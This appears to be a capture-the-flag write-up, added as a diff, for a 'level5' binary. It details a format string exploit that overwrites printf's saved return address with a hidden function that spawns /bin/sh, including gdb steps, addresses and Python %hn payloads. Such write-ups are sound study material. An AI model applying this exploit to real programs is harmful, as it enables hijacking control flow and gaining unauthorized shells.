@@ -1,0 +1,80 @@
+Here again, methodology is similar to the level3 and level4.
+We must perfom a format string attack.
+
+However, it will be a bit more complicated because the n() function finish by
+an exit() call.
+It makes useless the overwrite of the saved EIP of the functions because it won't be used.
+
+After some research, ("info functions") we can see than a function o(), called nowhere.
+But, handling a system("/bin/sh")
+This is our key.
+
+We must find a saved EIP to overwrite and put it the address of o().
+
+Hopefully, we can calculate the saved EIP inside of the printf, in order to return into o()
+when printf terminates.
+
+To find the place where the printf saved EIP will be stored, we must stop on the framestack
+which call printf.
+Check the value where esp is stored and substract it -4.
+(because the call instruction push the address of the next instruction on the stack)
+
+gdb ./level5
+b n
+print/x $esp-4
+
+Prints :
+0xbffff4dc
+
+The saved EIP, for the return of the print will be saved at 0xbffff4dc
+
+Now we must create a format attack which will write the address of o() at 0xbffff4dc.
+The address of o() is 0x080484a4
+
+In a first while we must ansure to write well the value of o() on the stack.
+If we write it directly on the saved EIP, we won't an easy way to check if we wrote it well.
+
+Let's write it on the stack first. Address of ESP is : 0xbffff4e0
+
+Python :
+address_stack = "\xbf\xff\xf4\xe2"[::-1] + "xxxx" + "\xbf\xff\xf4\xe0"[::-1]
+pads = ("%08x" * 3) + "%hn"
+print address_stack + pads
+
+After a break following printf, ESP is equal to 0x0024f4f0
+We can see that it wrote 0024 on the two last bytes.
+
+0x0804 - 0x24 = 0x7e0 = 2016
+2017 + 8 (because we removed a $08x)
+= 2024
+
+Python :
+address_stack = "\xbf\xff\xf4\xe2"[::-1] + "xxxx" + "\xbf\xff\xf4\xe0"[::-1]
+pads = ("%08x" * 2) + "%2024x" +  "%hn"
+print address_stack + pads
+
+Now after a new try, ESP is equal to 0x0804f4f0
+We have the first part of the o() address. Let's write the second part.
+
+We have actually written 0x804 chars (2052) and we need to reach 0x84a4 (33956)
+0x84a4 - 0x804 = 0x7ca0 = 31904
+
+Now ESP has the value 0x080484a4. We wrote well the address of o().
+Now let's write it at the right place : ESP - 4 (on the n() framestack)
+
+To remmeber :
+ESP - 4 = 0xbffff4dc
+
+Python :
+address_saved_eip = "\xbf\xff\xf4\xde"[::-1] + "xxxx" + "\xbf\xff\xf4\xdc"[::-1]
+pads = ("%08x" * 2) + "%2024x" + "%hn" + "%31904x" + "%hn"
+print address_saved_eip + pads
+
+Now out of GDB :
+(python /tmp/format.py cat -) | ./level5
+
+Opens the bash.
+
+
+
+
